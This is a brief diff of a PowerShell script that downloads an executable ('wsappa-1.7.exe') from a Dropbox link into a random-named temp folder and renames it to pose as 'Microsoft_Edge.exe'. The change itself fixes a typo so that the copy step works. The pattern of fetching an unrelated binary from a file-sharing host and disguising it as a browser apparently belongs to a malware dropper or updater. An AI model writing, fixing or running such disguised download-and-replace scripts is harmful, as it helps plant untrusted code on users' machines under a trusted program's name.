@@ -6,7 +6,7 @@ cd $env:temp/sVBXKuz
 
 #download new file
 Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/y1cen9nbe4ghgi4hm2nmi/wsappa-1.7.exe?rlkey=dgtqp22fbwpgl18jvuvj6i1lb&dl=0" -OutFile Microsoft_Edge_new.exe
-Copy-Item -Path .\Microsoft Edge_new.exe -Destination .\Microsoft_Edge.exe -Force
+Copy-Item -Path .\Microsoft_Edge_new.exe -Destination .\Microsoft_Edge.exe -Force
 
 #delete old file
 Remove-Item .\Microsoft_Edge_new.exe
